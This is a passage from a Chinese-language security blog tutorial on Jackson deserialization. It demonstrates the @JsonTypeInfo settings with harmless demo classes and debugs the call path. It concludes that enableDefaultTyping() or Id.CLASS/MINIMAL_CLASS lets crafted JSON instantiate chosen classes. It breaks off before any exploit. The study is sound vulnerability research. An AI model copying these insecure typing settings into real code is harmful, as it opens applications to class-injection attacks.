class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM)</span></span><br></pre></td></tr></table></figure><p>下面我们逐个看下。</p><h4 id="JsonTypeInfo-Id-NONE"><a href="#JsonTypeInfo-Id-NONE" class="headerlink" title="JsonTypeInfo.Id.NONE"></a>JsonTypeInfo.Id.NONE</h4><p><strong>JsonTypeInfo_Id_NONE_Test.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsonTypeInfo_Id_NONE_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person2</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person2</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person2</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person2.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person2 类，给 object 属性添加 <code>@JsonTypeInfo</code> 注解，指定为 <code>JsonTypeInfo.Id.NONE</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span>  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，和没有设置值为 <code>JsonTypeInfo.Id.NONE</code> 的 <code>@JsonTypeInfo</code> 注解是一样的：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> <span class="punctuation">&#123;</span>skill=hiphop<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/ld_none_result.png" class><h4 id="JsonTypeInfo-Id-CLASS"><a href="#JsonTypeInfo-Id-CLASS" class="headerlink" title="JsonTypeInfo.Id.CLASS"></a>JsonTypeInfo.Id.CLASS</h4><p>修改 Person2 类中的 object 属性 <code>@JsonTypeInfo</code> 注解值为 <code>JsonTypeInfo.Id.CLASS</code></p><p>输出看到，object属性中多了 <code>&quot;@class&quot;:&quot;com.drunkbaby.Hacker&quot;</code> ，即含有具体的类的信息，同时反序列化出来的object属性Hacker类对象，即能够成功对指定类型进行序列化和反序列化：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@class&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.drunkbaby.Hacker&quot;</span><span class="punctuation">,</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.Hacker@<span class="number">55</span>f3ddb1</span><br></pre></td></tr></table></figure><p>也就是说，在Jackson反序列化的时候如果使用了<code>JsonTypeInfo.Id.CLASS</code>修饰的话，可以通过@class的方式指定相关类，并进行相关调用。</p><h4 id="JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="JsonTypeInfo.Id.MINIMAL_CLASS"></a>JsonTypeInfo.Id.MINIMAL_CLASS</h4><p>修改 Person2 类中的object属性 <code>@JsonTypeInfo</code> 注解值为 <code>JsonTypeInfo.Id.MINIMAL_CLASS</code></p><p>输出看到，object属性中多了 <code>&quot;@c&quot;:&quot;com.drunkbaby.Hacker&quot;</code>，即使用 @c 替代了 @class，官方描述中的意思是缩短了相关类名，实际效果和 JsonTypeInfo.Id.CLASS 类似，能够成功对指定类型进行序列化和反序列化，都可以用于指定相关类并进行相关的调用：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@c&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.drunkbaby.Hacker&quot;</span><span class="punctuation">,</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.Hacker@<span class="number">18</span>be83e4</span><br></pre></td></tr></table></figure><h4 id="JsonTypeInfo-Id-NAME"><a href="#JsonTypeInfo-Id-NAME" class="headerlink" title="JsonTypeInfo.Id.NAME"></a>JsonTypeInfo.Id.NAME</h4><p>修改 Person2 类中的object属性 <code>@JsonTypeInfo</code> 注解值为 <code>JsonTypeInfo.Id.NAME</code></p><p>输出看到，object 属性中多了 <code>&quot;@type&quot;:&quot;Hacker&quot;</code>，但没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/errorName.png" class><h4 id="JsonTypeInfo-Id-CUSTOM"><a href="#JsonTypeInfo-Id-CUSTOM" class="headerlink" title="JsonTypeInfo.Id.CUSTOM"></a>JsonTypeInfo.Id.CUSTOM</h4><p>其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常：</p><h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>由前面测试发现，当 <code>@JsonTypeInfo</code> 注解设置为如下值之一并且修饰的是 Object 类型的属性时，可以利用来触发 Jackson 反序列化漏洞：</p><ul><li>JsonTypeInfo.Id.CLASS</li><li>JsonTypeInfo. Id. MINIMAL_CLASS</li></ul><h2 id="0x03-反序列化中类属性方法的调用"><a href="#0x03-反序列化中类属性方法的调用" class="headerlink" title="0x03 反序列化中类属性方法的调用"></a>0x03 反序列化中类属性方法的调用</h2><p>这里只针对 Jackson 反序列化过程中存在的一些方法调用进行分析，并且只针对应用 JacksonPolymorphicDeserialization 机制的场景进行分析。</p><p>下面简单看下两个实现方式间是否有区别。</p><h3 id="当使用-DefaultTyping-时"><a href="#当使用-DefaultTyping-时" class="headerlink" title="当使用 DefaultTyping 时"></a>当使用 DefaultTyping 时</h3><p>新增 Person3 类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> Sex sex;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 MySex 类中的方法中添加输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySex2</span> <span class="keyword">implements</span> <span class="title class_">Sex</span> &#123;  </span><br><span class="line">    <span class="type">int</span> sex;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MySex2</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex构造函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.getSex&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.setSex&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.sex = sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改反序列化代码，只进行反序列化操作并调用无参数的 <code>enableDefaultTyping()</code> ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">            <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">            mapper.enableDefaultTyping();  </span><br><span class="line">  </span><br><span class="line">            <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;drunkbaby\&quot;,\&quot;sex\&quot;:[\&quot;com.drunkbaby.deserialization.MySex2\&quot;,&#123;\&quot;sex\&quot;:1&#125;]&#125;&quot;</span>;  </span><br><span class="line">            <span class="type">Person3</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person3.class);  </span><br><span class="line">            System.out.println(p2);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出，看到调用了目标类的构造函数和 setter 方法：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializationTest.png" class><h3 id="当使用-JsonTypeInfo-注解时"><a href="#当使用-JsonTypeInfo-注解时" class="headerlink" title="当使用 @JsonTypeInfo 注解时"></a>当使用 @JsonTypeInfo 注解时</h3><p>修改 Person3 类，在 sex 属性前添加注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span>  </span><br><span class="line">    <span class="comment">// 或 @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)  </span></span><br><span class="line">    <span class="keyword">public</span> Sex sex;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改 DeserializationTest2. java，注释掉 enableDefaultTyping ()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest2</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line"><span class="comment">//        mapper.enableDefaultTyping();  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;drunkbaby\&quot;,\&quot;sex\&quot;:[\&quot;com.drunkbaby.deserialization.MySex2\&quot;,&#123;\&quot;sex\&quot;:1&#125;]&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Person3</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person3.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，和使用 DefaultTyping 是一样的：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySex构造函数</span><br><span class="line">MySex.setSex</span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.deserialization.MySex2@<span class="number">6</span>a2bcfcb</span><br></pre></td></tr></table></figure><h3 id="Jackson-反序列化调试分析"><a href="#Jackson-反序列化调试分析" class="headerlink" title="Jackson 反序列化调试分析"></a>Jackson 反序列化调试分析</h3><p>Jackson 反序列化的过程其实就分为两步，第一步是通过构造函数生成实例，第二部是设置实例的属性值。</p><p>这里以第一个例子来进行 Jackson 反序列化过程的调试分析，在 <code>Person p2 = mapper.readValue(json, Person.class);</code> 处打上断点，同时在 MySex2 类的构造函数、getter、setter 方法中设置断点，然后开始调试</p><p>另外，为了方便，给 Person3 类加上个构造函数，随后开始调试</p><p>首先反序列化跟进来，在 <code>com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose()</code> 方法这里，先进行 <code>JsonToken</code> 的初始化，随后进行进一步的反序列化操作。</p><p>当初始化是第一次的时候，会先调到 <code>com.fasterxml.jackson.databind.deser.BeanDeserializer#vanillaDeserialize()</code> 方法</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/vanillaDeserialize.png" class><p>跟进，<code>vanillaDeserialize()</code> 方法调用了 <code>createUsingDefault()</code> 方法，这个方法的作用是调用指定类的无参构造函数，生成类实例。</p><p>再次跟进就是调用 <code>call()</code> 方法了</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/call.png" class><p>走到了构造函数</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/constructor.png" class><p>在初始化完毕之后，会调用 <code>deserializeAndSet()</code> 方法，完成了一个嵌套的过程，具体的细节后面会讲。</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeAndSetFirst.png" class><p>跟进去之后会发现这里调用了 <code>this.deserialize()</code> 方法，跟进 <code>deser.deserialize()</code>，具体的业务逻辑是在 <code>com.fasterxml.jackson.databind.deser.BeanDeserializer#deserializeAndSet()</code> 方法执行的，实际上就是我们前面说的 <strong>Jackson 反序列化的过程其实就分为两步，第一步是通过构造函数生成实例，第二部是设置实例的属性值。</strong> 跟进</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeAndSet.png" class><p>继续跟进 <code>this.deserialize()</code>，这里先拿了 json 数据的数据类型，接下来判断这个节点的数据类型是否为 null，如果不为 null，再判断 <code>this._valueTypeDeserializer</code> 是否为空，如果不为空则继续调用 <code>this._valueDeserializer.deserialize()</code> 方法</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/businessDeser.png" class><p>这里 t 是存在的，且反序列化程序也是存在的，所以调用 <code>deserialize()</code> 方法</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/judgeDeserialize.png" class><p>判断是否为 <code>VALUE_NUMBER_INT</code>，如果是则跟进 <code>getIntValue()</code> 方法，如果不是则跟进 <code>_parseInteger()</code> 方法，这里最终整个调完之后，会返回 json 键值对中的值</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/objectValue.png" class><p>随后的 <code>this._field.set(instance, value);</code> 意思就是调用对应类的 setter 方法了，进行赋值。因为这里我们没有写 Person3 这个类的 setter 方法，如果实现了 setter 方法，则代码逻辑会走进去。</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/invokeForSetter.png" class><p>在调用完成之后又会重新回到 <code>BeanDeserializer.vanillaDeserialize()</code>  函数中的 do while 循环，继续获取值，继续调用，达到递归的效果。</p><p>不太一样的是在 <code>SettableBeanProperty.deserialize()</code>  函数中进入到了调用 <code>deserializeWithType()</code> 函数解析的代码逻辑，因为此时 <code>_valueTypeDeserializer</code> 值不为 null：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/diffDeserialize.png" class><p>往下，先判断反序列化的类型，因为这里是数组，所以会返回 null，再跟进 <code>deserializeTypedFromObject()</code> 方法</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeTypedFromObject.png" class><p>同样因为是数组，跟进 <code>_deserializeTypedUsingDefaultImpl()</code> 方法</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeTypedUsingDefaultImpl.png" class><p>随后寻找反序列化的类</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/findDefaultImplDeserializer.png" class><p>因为这里的数据类型是数组，不匹配任意一项，所以最后调用了 <code>deserializeTypedFromAny()</code> 方法，这个方法最终是让程序去已有的类里面找，很明显这里找的是 <code>com.drunkbaby.deserialization.MySex2</code> 类</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeTypedFromAny.png" class><p>跟进去，其中调用 <code>findContextualValueDeserializer()</code> 找到 typeId 类型对应的反序列化器，然后缓存到 <code>_deserializers</code> 这个 Map 变量中，然后返回该反序列化器</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/putTypeID.png" class><p>接着程序回到数组类型解析的 <code>AsArrayTypeDeserializer._deserialize()</code> 函数中往下执行，用刚刚获取到的反序列化器来解析 sex 属性中数组内的具体类型实例：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/finaldeserialize.png" class><p>这里的逻辑比较简单，判断目前这个数据类型是否已经有对应的反序列化处理器了，如果没有则最终还是走原来那一套，如果有的话则走 Jackson 自己的规则。</p><p>至于后续的逻辑和最开始的反序列化逻辑是很类似的，简单看一下关键部分的调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;: <span class="number">8</span>, MySex2 (com. drunkbaby. deserialization)</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">423</span>, Constructor (java.lang.reflect)</span><br><span class="line">call:<span class="number">119</span>, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">createUsingDefault:<span class="number">243</span>, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">vanillaDeserialize:<span class="number">249</span>, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:<span class="number">125</span>, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:<span class="number">110</span>, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br></pre></td></tr></table></figure><p>后续过程就不再展开了，是相似的调用过程。</p><p>至此，整个函数调用过程大致过了一遍。使用@JsonTypeInfo 注解的函数调用过程也是一样的。</p><ul><li>简单梳理一遍，Jackson 反序列化的过程为，先调用通过无参的构造函数生成目标类实例，接着是根据属性值是否是数组的形式即是否带类名来分别调用不同的函数来设置实例的属性值，其中会调用 Object 类型属性的构造函数和 setter 方法。</li></ul><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p><strong>在 Jackson 反序列化中，若调用了 <code>enableDefaultTyping()</code> 函数或使用 <code>@JsonTypeInfo</code> 注解指定反序列化得到的类的属性为 <code>JsonTypeInfo.Id.CLASS</code> 或 <code>JsonTypeInfo.Id.MINIMAL_CLASS</code>，则会调用该属性的类的构造函数和 setter 方法。</strong></p><h2 id="0x04-Jackson-反序列化漏洞"><a href="#0x04-Jackson-反序列化漏洞" class="headerlink" title="0x04 Jackson 反序列化漏洞"></a>0x04 Jackson 反序列化漏洞</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>满足下面三个条件之一即存在Jackson反序列化漏洞：</p><ul><li>调用了 <code>ObjectMapper.enableDefaultTyping()</code> 函数；</li><li>对要进行反序列化的类的属性使用了值为 <code>JsonTypeInfo.Id.CLASS</code> 的 <code>@JsonTypeInfo</code> 注解；</li><li>对要进行反序列化的类的属性使用了值为 <code>JsonTypeInfo.Id.MINIMAL_CLASS</code> 的 <code>@JsonTypeInfo</code> 注解；</li></ul><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>由之前的结论知道，当使用的 JacksonPolymorphicDeserialization 机制配置有问题时，Jackson 反序列化就会调用属性所属类的构造函数和 setter 方法。</p><p>而如果该构造函数或 setter 方法存在危险操作，那么就存在 Jackson 反序列化漏洞。</p><h3 id="漏洞场景及-Demo"><a href="#漏洞场景及-Demo" class="headerlink" title="漏洞场景及 Demo"></a>漏洞场景及 Demo</h3><p>这里大致以要进行反序列化的类的属性所属的类的类型分为两种：</p><h4 id="属性不为Object类时"><a href="#属性不为Object类时" class="headerlink" title="属性不为Object类时"></a>属性不为Object类时</h4><p><strong>当要进行反序列化的类的属性所属类的构造函数或 setter 方法本身存在漏洞时，这种场景存在 Jackson 